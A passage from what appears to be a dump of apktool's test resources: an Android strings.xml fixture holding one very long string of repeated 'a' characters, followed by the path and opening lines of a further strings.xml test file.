aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</string>
</resources>
```

`brut.apktool/apktool-lib/src/test/resources/testapp/res/values-feminine/strings.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
